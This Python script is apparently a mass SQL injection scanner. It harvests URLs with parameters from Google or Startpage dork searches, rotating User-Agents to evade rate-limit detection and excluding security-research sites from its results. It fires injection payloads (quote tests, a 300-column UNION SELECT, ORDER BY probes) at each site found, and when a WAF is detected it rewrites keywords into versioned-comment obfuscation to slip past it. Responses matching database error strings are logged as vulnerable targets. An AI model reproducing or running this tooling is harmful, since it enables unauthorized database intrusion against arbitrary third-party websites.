


import os
import sys
import requests
import time
from random import randint
from termcolor import colored


def     block_cutter (string, int_start, int_end):

        newd = ""

        while (int_start <= int_end):
            newd += string[int_start]
            int_start += 1
        return newd


def     focpa (url, param):
    burl = ""
    i = 0
    ca = 0
    cb = 0
    tmp = ""
    
    while (i < len(url)):
        if (url[i] == '?' or url[i] == '&'):
            i += 1
            ca = i
            while (i < len(url) and url[i] != param[len(param)-1]):
                i += 1
            cb = i
            tmp = block_cutter(url, ca, cb)
            if (tmp == param):
                burl = block_cutter(url, 0, cb)
                return burl
            else:
                burl = ca+1        
        i += 1

    return -1



def     dump_page(string):
        dump = []
        string = string.replace("range(", '')
        string = string.replace(')', '')
        dump = string.split(',')
    
        return dump



def     rand_agent ():

        agent_file = open('agents.txt', 'r')
        size = int(len(agent_file.readlines())-1)
        rnd_n = randint(5, size)
        agent_file.close()
        agent_file = open('agents.txt', 'r')
        user_agent = str(agent_file.readlines()[rnd_n])
        agent_file.close()
        user_agent = user_agent.replace('\n', '')
        return user_agent



def     ipuser ():

        ca = 0
        cb = 0
        ipreq = requests

        try:
            ipreq = requests.get('https://www.iplocation.net/find-ip-address')
            data = ipreq.text.encode('utf-8')

            if (data.find("color:green;'>") > -1):
                ca = data.find("color:green;'>")+len("color:green;'>")
            if (data.find("</span>.<br /><span") > -1):
                cb = data.find("</span>.<br /><span")-1
            ipuser_str = block_cutter (data, ca, cb)

        except requests.exceptions.ConnectionError:
            ipreq.status_code = "Connection refused"
            print colored(" [!] IP Public Error \n", 'red')
            ipuser_str = "NULL"
        
        return str(ipuser_str)




def     myParserGSE (greq, bp):

        i = 0 
        ca = 0
        cb = 0
        
        urls = []
        nurls = []

        if (greq.find("<b>About this page</b><br><br>Our systems have detected unusual traffic from your computer network.") > -1):
            print colored(" [!] Google Security Traffic page detected ! < Unusual Traffic >", 'red')
            print colored(" [*] Advice: Change your IP -or- wait 1/2 hours -or- Bypass this ! -or- Try with '-b 1'", 'blue')
            urls.append("!gsec!")
            return urls

        while (i < len(greq)-1):
                
            if (greq[i] == 'h'):
                ca = i
                while (i < len(greq)-1 and greq[i] != ':'):
                    i += 1
                cb = i
                tmp = block_cutter (greq, ca, cb)
            
                if (tmp == 'http:' or tmp == 'https:' or (tmp == "h3 class='clk'><a href='http:" and bp > 0) or (tmp == "h3 class='clk'><a href='https:" and bp > 0) or (tmp == "href='http:" and bp > 0) or (tmp == "href='https:" and bp > 0)):

                    while (i < len(greq)-1 and greq[i] != ' '):
                        i += 1
                    cb = i
                    if (bp > 0):
                        url_found = block_cutter (greq, (ca+len("h3 class='clk'><a href='")), cb-2)
                    else:
                        url_found = block_cutter (greq, ca, cb)
                    

                    if (url_found.find('%252B') > -1):
                        url_found = block_cutter (url_found, 0, url_found.find('%252B')-1)
                    if (url_found.find('</cite>') > -1):
                        url_found = block_cutter (url_found, 0, url_found.find('</cite>')-1)
                    if (url_found.find('&amp;') > -1):
                        url_found = block_cutter (url_found, 0, url_found.find('&amp;')-1)
                    if (url_found.find('+') > -1):
                        url_found = block_cutter (url_found, 0, url_found.find('+')-1)
                    if (url_found.find('&nbsp;') > -1):
                        url_found = block_cutter (url_found, 0, url_found.find('&nbsp;')-1)
                    if (url_found.find('...') > -1):
                        url_found = block_cutter (url_found, 0, url_found.find('...')-1)
                    if (url_found.find('&L=') > -1):
                        url_found = block_cutter(url_found, 0, url_found.find('&L=')-1)
                    if (url_found.find('#') > -1):
                        url_found = block_cutter(url_found, 0, url_found.find('#')-1)
                    if (url_found.find('.</') > -1):
                        url_found = block_cutter(url_found, 0, url_found.find('.</')-1)
                    if (url_found.find('.</span></div></div><div') > -1):
                        url_found = block_cutter(url_found, 0, url_found.find('.</span></div></div><div')-1)

                    #if (url_found.find('<b>') > -1):
                    url_found = url_found.replace('<b>', '')
                    #if (url_found.find('</b>') > -1):
                    url_found = url_found.replace('</b>', '')
                    #if (url_found.find('"') > -1):
                    url_found = url_found.replace('"', '')
                    #if (url_found.find('<br>') > -1):
                    url_found = url_found.replace('<br>', '')
                    #if (url_found.find('</br>') > -1):
                    url_found = url_found.replace('</br>', '')
                    
                    
                    #if (url_found.find('%253F') > -1):
                    url_found = url_found.replace('%253F', '')
                    #if (url_found.find('%3F') > -1):
                    url_found = url_found.replace('%3F', '?')
                    #if (url_found.find('%253D') > -1):
                    url_found = url_found.replace('%253D', '=')
                    #if (url_found.find('%2526') > -1):
                    url_found = url_found.replace('%2526', '&')
                    #if (url_found.find('%3D') > -1):
                    url_found = url_found.replace('%3D', '=')
                    #if (url_found.find('%26') > -1):
                    url_found = url_found.replace('%26', '&')


                    if (url_found.find('.google.') == -1 and url_found.find('.gstatic.') == -1 and url_found.find('injection-sql') == -1 and url_found.find('sql-injection') == -1 and url_found.find('sql-injections') == -1 and url_found.find('sql-dorks') == -1 and url_found.find('dorks') == -1 and url_found.find('hack') == -1 and url_found.find('scribd') == -1 and url_found.find('pastebin') == -1 and url_found.find('stackoverflow') == -1 and url_found.find('over-blog') == -1 and url_found.find('github') == -1 and url_found.find('blogspot') == -1 and url_found.find('facebook') == -1 and url_found.find('moodle.') == -1 and url_found.find('openclassroom') == -1 and url_found.find('cracking.org') == -1 and url_found.find('websec.ca') == -1 and url_found.find('sql_injection') == -1 and url_found.find('injection_sql') == -1 and url_found.find('carding_dork') == -1 and url_found.find('carding-dork') == -1 and url_found.find('hacking') == -1 and url_found.find('vulnerability-lab.com') == -1):
                        if ((url_found.find('http:') > -1 or url_found.find('https:') > -1) and url_found.find('=') > -1 and url_found.find('?') > -1 and url_found.find('ixquick-proxy.com') == -1 and url_found.find('forum.phpdebutant') == -1 and url_found.find('youtube.com') == -1):
                            urls.append(url_found)
                            print (" [!] URL Found: "+url_found)
                    #else:
                        #print (" [*] URL Ignored: "+url_found)
                    
            i += 1

        nurls = list(set(urls))
        return nurls
        

def     sbws (string):

        string = string.replace(" ", "+")
        string = string.replace("UNION", "/*!50000UnIoN*/")
        string = string.replace("ORDER", "/*!50000OrDeR*/")
        string = string.replace("GROUP_CONCAT", "/*!50000GrOuP_CoNcAt*/")
        string = string.replace("CONCAT", "/*!50000CoNcAt*/")
        string = string.replace("CHAR", "/*!50000ChAr*/")
        string = string.replace("FROM", "/*!50000FrOm*/")
        string = string.replace("WHERE", "/*!50000WhErE*/")
        string = string.replace("RAND", "/*!50000RaNd*/")
        string = string.replace("FLOOR", "/*!50000FlOoR*/")
        string = string.replace("HEX", "/*!50000HeX*/")
        string = string.replace("UNHEX", "/*!50000UnHeX*/")
        string = string.replace("LIMIT", "/*!50000LiMiT*/")
        string = string.replace("ELT", "/*!50000ElT*/")
        string = string.replace("SLEEP", "/*!50000SlEeP*/")
        string = string.replace("SELECT", "/*!50000SeLeCt*/")
        string = string.replace("COUNT", "/*!50000CoUnT*/")
        string = string.replace("@@version", "/*!50000@@VeRsIoN*/")
        string = string.replace("version()", "/*!50000VeRsIoN()*/")
        string = string.replace("database()", "/*!50000DaTaBaSe()*/")
        string = string.replace("TABLE_NAME", "/*!50000TaBlE_NaMe*/")
        string = string.replace("COLUMN_NAME", "/*!50000CoLuMn_NaMe*/")
        string = string.replace("INFORMATION_SCHEMA.TABLES", "/*!50000InFoRmAtIoN_ScHeMa.TaBlEs*/")
        string = string.replace("INFORMATION_SCHEMA.COLUMNS", "/*!50000InFoRmAtIoN_ScHeMa.CoLuMnS*/")
        string = string.replace("INFORMATION_SCHEMA.PLUGINS", "/*!50000InFoRmAtIoN_ScHeMa.PlUgInS*/")
        string = string.replace("TABLE_SCHEMA", "/*!50000TaBlE_ScHeMa*/")
        string = string.replace("GROUP", "/*!50000GrOuP*")
        string = string.replace("LIKE", "/*!50000LiKe*/")
        string = string.replace("BY", "/*!50000By*/")
        string = string.replace("CONCAT_WS", "/*!50000CoNcAt_Ws*/")
        string = string.replace("HAVING", "/*!50000HaViNg*/")
        string = string.replace("MIN", "/*!50000MiN*/")
        string = string.replace("CAST", "/*!50000CaSt*/")
        string = string.replace("AS", "/*!50000As*/")
        string = string.replace("CHAR", "/*!50000ChAr*/")
        string = string.replace("AND", "/*!50000AnD*/")
        string = string.replace("OR", "/*!50000Or*/")
        
        return string




def     myParserSQLE (url, forcing, timeout):
    
        lvl = 0
        terms_found = []
        nterms = 0
        
        burl = ""
        nurl = ""
        data = ""
        waf = 0 

        user_agent = rand_agent()
        headers = {'User-Agent': user_agent}
    
        wb_req = type(requests)

        try:
            
            #ForcingOpt
            if (forcing != '' and url.find(forcing) > -1 and focpa(url, forcing) != -1):
                print colored(" [!] Forcing - stress URL", 'cyan')
                forcing = str(forcing)
                burl = focpa(url, forcing)
                nurl = burl
                nurl += "1984 AND CONCAT(CHAR(088,071,068,079,082,075,013,010))"
                if (timeout > 0.0):
                    req = requests.get(nurl, headers=headers, timeout=timeout)
                else:
                    req = requests.get(nurl, headers=headers)
                data = req.text.encode('utf-8')
                if (data.find("Mod_Security") > -1 or data.find("You don't have permission ") > -1):
                    print colored(" [!] simple WAF Detected ! Others potential security ... ", 'red')
                    waf = 1

                nurl = burl
                nurl += "-300 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,123,124,125,126,127,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,database(),156,157,158,159,160,161,162,163,164,165,166,167,168,169,170,171,172,173,174,175,176,177,178,179,180,181,182,183,184,185,186,187,188,189,190,191,192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,207,208,209,210,211,212,213,214,215,216,217,218,219,220,221,222,223,224,225,226,227,228,229,230,231,232,233,234,235,236,237,238,239,240,241,242,243,244,245,246,247,248,249,250,251,252,253,254,255,256,257,258,259,260,261,262,263,264,265,266,267,268,269,270,271,272,273,274,275,276,277,278,279,280,281,282,283,284,285,286,287,288,289,290,291,292,293,294,295,296,297,298,299,300 --"
                if (waf == 1):
                    nurl = sbws(nurl)
                if (timeout > 0.0):
                    req = requests.get(nurl, headers=headers, timeout=timeout)
                else:
                    req = requests.get(nurl, headers=headers)
                data = req.text.encode('utf-8')
                if (data.find('The used SELECT statements ') > -1):
                    print colored(" [!] this technique is potentially feasible - ERROR-BASED -", 'green')
                    print colored(" [*] Error potential : The used SELECT statements, Others errors ...", 'cyan')
                    lvl += 10
                
                nurl = burl
                nurl += "777 ORDER BY 777 --"
                if (waf == 1):
                    nurl = sbws(nurl)
                if (timeout > 0.0):
                    req = requests.get(nurl, headers=headers, timeout=timeout)
                else:
                    req = requests.get(nurl, headers=headers)
                data = req.text.encode('utf-8')
                if (data.find("Unknown column '") > -1 and data.find("' in 'order clause'") > -1 or data.find('mysql_num_rows():') > -1 or data.find('mysql_num_row():') > -1):
                    print colored(" [!] this technique is potentially feasible - UNION-BASED -  ", 'green')
                    print colored(" [*] Error potential : Unknown column in 'order clause', mysql_num_rows():, mysql_num_row():, Others errors...", 'cyan')
                    lvl += 10

            if (timeout > 0.0):
                wb_req = requests.get(url, headers=headers, timeout=timeout)
            else:
                wb_req = requests.get(url, headers=headers)
            data = wb_req.text.encode('utf-8')

            #SFind
            if (data.find('MySQL') > -1):
                terms_found.append('MySQL')
                nterms += 1
                lvl += 1
            if (data.find('SQL') > -1):
                terms_found.append('SQL')
                nterms += 1
                lvl += 1
            if (data.find('SQL syntax') > -1):
                terms_found.append('SQL syntax')
                nterms += 1
                lvl += 3
            if (data.find('Warning:') > -1):
                terms_found.append('Warning:')
                nterms += 1
                lvl += 1
            if (data.find('Invalid argument supplied for') > -1):
                terms_found.append('Invalid argument supplied for')
                nterms += 1
                lvl += 1
            if (data.find('Notice: Undefined variable: ') > -1):
                terms_found.append('Notice: Undefined variable: ')
                nterms += 1
                lvl += 2
            if (data.find('supplied argument is not a valid MySQL result resource in') > -1):
                terms_found.append('supplied argument is not a valid MySQL result ressource in')
                nterms += 1
                lvl += 4
            if (data.find('valid MySQL result') > -1):
                terms_found.append('valid MySQL result')
                nterms += 1
                lvl += 5
            if (data.find('Incorrect syntax near') > -1):
                terms_found.append('Incorrect syntax near')
                nterms += 1
                lvl += 4
            if (data.find('Incorrect parameter count in the call to native function ') > -1):
                terms_found.append('Incorrect parameter count in the call to native function ')
                nterms += 1
                lvl += 4
            if (data.find('You have an error in your SQL syntax') > -1):
                terms_found.append('You have an error in your SQL syntax')
                nterms += 1
                lvl += 5
            if (data.find('Warning: mysql_num_rows(): ') > -1):
                terms_found.append('Warning: mysql_num_rows(): ')
                nterms += 1
                lvl += 5
            if (data.find('Warning: mysql_num_row(): ') > -1):
                terms_found.append('Warning: mysql_num_row(): ')
                nterms += 1
                lvl += 5
            if (data.find('Warning: mysql_fetch_array(): ') > -1):
                terms_found.append('Warning: mysql_fetch_array(): ')
                nterms += 1
                lvl += 4
            if (data.find('Warning: mysql_query(): ') > -1):
                terms_found.append('Warning: mysql_query(): ')
                nterms += 1
                lvl += 4
            if (data.find('Warning: mysql_result(): ') > -1):
                terms_found.append('Warning: mysql_result(): ')
                nterms += 1
                lvl += 4
            if (data.find('Warning: Unknown(): ') > -1):
                terms_found.append('Warning: Unknown(): ')
                nterms += 1
                lvl += 3
            if (data.find('Warning: array_merge(): ') > -1):
                terms_found.append('Warning: array_merge(): ')
                nterms += 1
                lvl += 3
            if (data.find('Warning: require(): ') > -1):
                terms_found.append('Warning: require(): ')
                nterms += 1
                lvl += 3
            if (data.find('MySQL Error: ') > -1):
                terms_found.append('MySQL Error: ')
                nterms += 1
                lvl += 3
            if (data.find('SQL Error: ') > -1):
                terms_found.append('SQL Error: ')
                nterms += 1
                lvl += 3
            if (data.find('Unable to jump to row') > -1):
                terms_found.append('Unable to jump to row')
                nterms += 1
                lvl += 2
            if (data.find('Session halted.') > -1):
                terms_found.append('Session halted.')
                nterms += 1
                lvl += 3
            if (data.find('Access denied for') > -1):
                terms_found.append('Access denied for')
                nterms += 1
                lvl += 2
            if (data.find('ODBC SQL Server Driver') > -1):
                terms_found.append('ODBC SQL Server Driver')
                nterms += 1
                lvl == 1
            if (data.find('argument should be an array in') > -1):
                terms_found.append('argument should be an rray in')
                nterms += 1
                lvl += 4
            if (data.find(' expects parameter 1 to be resource, boolean given in ') > -1):
                terms_found.append('expects parameter 1 to be resource, boolean given in ')
                nterms += 1
                lvl += 3
            if (data.find('Warning: array_key_exists()') > -1):
                terms_found.append('Warning: array_key_exists()')
                nterms += 1
                lvl += 2
            if (data.find('Warning: parse_ini_file') > -1):
                terms_found.append('Warning: parse_ini_file')
                nterm += 1
                lvl += 2
            if (data.find('SAFE MODE Restriction in effect.') > -1):
                terms_found.append('SAFE MODE Restriction in effect.')
                nterms += 1
                lvl += 1



            if (lvl > 0 and lvl < 4):
                print colored(" [!] Vulnerable [!] ", 'green')
                print colored("     Parser Lvl : "+str(lvl)+" - Very Low", 'cyan')
                print colored("     Term(s) overview : <"+str(nterms)+"> "+str(terms_found).replace(',', ' <-> '), 'green')
                return lvl
            elif (lvl > 3 and lvl < 6):
                print colored(" [!] Vulnerable [!] ", 'green')
                print colored("     Parser Lvl : "+str(lvl)+" - Low", 'cyan')
                print colored("     Term(s) overview : <"+str(nterms)+"> "+str(terms_found).replace(',', ' <-> '), 'green')
                return lvl
            elif (lvl > 5 and lvl < 9):
                print colored(" [!] Vulnerable [!] ", 'green')
                print colored("     Parser Lvl : "+str(lvl)+" - Medium", 'cyan')
                print colored("     Term(s) overview : <"+str(nterms)+"> "+str(terms_found).replace(',', ' <-> '), 'green')
                return lvl
            elif (lvl > 8 and lvl < 15):
                print colored(" [!] Vulnerable [!] ",'green')
                print colored("     Parser Lvl : "+str(lvl)+" - Hight *Critical", 'cyan')
                print colored("     Term(s) overview : <"+str(nterms)+"> "+str(terms_found).replace(',', ' <-> '), 'green')
                return lvl
            elif (lvl > 14):
                print colored(" [!] Vulnerable [!] ", 'green')
                print colored("     Parser Lvl : "+str(lvl)+" - Legendary *Critical+", 'green')
                print colored("     Term(s) overview : <"+str(nterms)+"> "+str(terms_found).replace(',', ' <-> '), 'green')
                return lvl
            else :
                print colored(" [-] Grrr ...", 'red')
                return lvl

        except requests.exceptions.ConnectionError:
            #wb_req.status_code = "Connection refused"
            print colored(" [-] Request Error, ignored ... ", 'cyan')
            ##b_req.status_code = "Connection refused"
        except requests.exceptions.TooManyRedirects:
            #wb_req.status_code = "Connection refused"
            print colored(" [-] Request Error, ignored ... ", 'cyan')
            #wb_req.status_code = "Connection refused"
        except requests.exceptions.ReadTimeout:
            print colored(" [-] Request Timeout, ignored ... ", 'cyan')
    


def     marvin_ppa (url, out_file, forcing, timeout):
        
        print colored("\n [Marvin Ppa] work on "+url, 'blue')
        
        qurl = url+"%%2727"
        if (url.find('search.php?search_id=') > -1):
            qurl = block_cutter(url, 0, (url.find('search.php?search_id=')+len("search.php?search_id=")-1))
            qurl += "1%%2727"
    
        if (myParserSQLE (qurl, forcing, timeout) > 0):
            dump = open(out_file, 'a')
            dump.write(url+"\n")
            dump.close()
            return 1
        else:
            return 0



def     moulinette (urls, out_file, forcing, timeout):

        i = 0
        n = 0
        stress = 0
        while (i < len(urls)):
            stress = marvin_ppa (urls[i], out_file, forcing, timeout)
            if (stress == 1):
                n += 1
            i += 1
        return n



def     search_engine (dork, n_page, out_file, bp, cdom, forcing, timeout):

        IP_PO = ipuser()
        print colored(" [*] Public IP overview: "+IP_PO+"\n", 'blue')

        su_filter = ""
        urls_found = []
        pvalue = 0
        i = 0
        ca = 0
        cb = 0
        
        tmplist1 = []
        tmplistB = []
        nosearch = 0
        breaker = 0
        x = 0

        if (len(dump_page(n_page)) > 1):
            pvalue = str(dump_page(n_page)[0])
            pvalue = pvalue.replace("'", '')
            pvalue = pvalue.replace('[', '')
            pvalue = pvalue.replace(']', '')
            i = int(pvalue)
            if (i <= 0):
                i = 1

            pvalue = str(dump_page(n_page)[1])
            pvalue = pvalue.replace("'", '')
            pvalue = pvalue.replace('[', '')
            pvalue = pvalue.replace(']', '')
            n_page = int(pvalue)

        else:
            pvalue = str(dump_page(n_page))
            pvalue = pvalue.replace("'", '')
            pvalue = pvalue.replace('[', '')
            pvalue = pvalue.replace(']', '')
            i = 0
            n_page = int(pvalue)
        
        if (len(cdom) > 0):
            if (cdom[0] == '.'):       
                cdom = block_cutter(cdom, 1, len(cdom)-1)

        print colored(" [*] GSE Crawling wait ...", 'cyan')

        if (bp > 0):
            user_agent = rand_agent()
            headers = {'User-Agent': user_agent}

            print colored("\n [+] User-Agent: "+user_agent, 'green')
            nurl = "https://s10-eu4.startpage.com/do/search?cmd=process_search&language=english&prf=21334709fc6a498bfad2ed75d1597501&suggestOn=1&rcount=&rl=NONE&abp=1&t=night&query="+dork+"&cat=web&engine0=v1all&startat=0&nj=0"
            print colored(" [*] Search SPGKey ...", 'cyan')
            r = requests.get(nurl, headers=headers)
            data = r.text.encode('utf-8')

            if (data.find("qid=") > -1):
                ca = (data.find("qid="))
                cb = ca
                while (cb < (len(data)-1) and data[cb] != '&'):
                    cb += 1
                SPGKey = block_cutter(data, ca+4, cb-1)
                print colored(" [!] SPGKey: "+SPGKey, 'green')
                
            else:
                print colored(" [*] ERROR SPGKey !", 'red')
                exit(0)

        while (i <= n_page-1 and breaker == 0):
            if (breaker == 1):
                break

            g_page = str(i*10)

            user_agent = rand_agent()
            headers = {'User-Agent': user_agent}
            
            print colored("\n [<S "+str(i)+"-"+str(g_page)+">] ", 'cyan')
            print colored(" [+] User-Agent: "+user_agent, 'green')

            if (bp > 0):
                
                time.sleep(randint(1, 3))
                nurl = "https://s10-eu4.startpage.com/do/search?cmd=process_search&language=english&prf=21334709fc6a498bfad2ed75d1597501&suggestOn=1&qid="+SPGKey+"&rcount=&rl=NONE&abp=1&t=night&query="+dork+"&cat=web&engine0=v1all&startat="+g_page+"&nj=0"
            
            else:
                time.sleep(randint(1, 3))
                if (cdom != ''):
                    print colored(" [+] Domain: "+cdom, 'green')
                    nurl = "https://www.google."+cdom+"/search?q="+dork+"&start="+g_page+"&num=10&filter=0"
                else:
                    nurl = "https://www.google.com/search?q="+dork+"&start="+g_page+"&num=10&filter=0"
            
            greq = requests.get(nurl, headers=headers)
            gdata = greq.text.encode('utf-8')
        
            tmplistA = myParserGSE (gdata, bp)
            
            if (nosearch >= 1):
                breaker = 1
                break
            if ((len(tmplistA)-1) == 0):
                nosearch += 1
            else:
                if ("!gsec!" in tmplistA == True):
                    tmplistA = tmplistA.remove("!gsec!")
                    breaker = 1
                    break
                if (tmplistA == tmplistB and (len(tmplistA)-1) != 0):
                    breaker = 1
                    break

                nosearch = 0 
                urls_found += tmplistA
            
                tmplistB = tmplistA

            i += 1
            x += 1
                
        
        urls_found = list(set(urls_found))

        if ((len(urls_found)-1) > 0):
            print colored("\n [*] GSE Crawling finished, Marvin Ppa > \n", 'cyan')
            nbr = moulinette (urls_found, out_file, forcing, timeout)
            print colored("\n [!] URLs Saved: "+str(nbr)+" in '"+out_file+"' !", 'green')
            print colored(" [*] Verify if is not fake positive ! ... \n\n", 'red')

        else:
            print colored(" [!] List is empty, Marvin Ppa is not happy ... ", 'red')








        
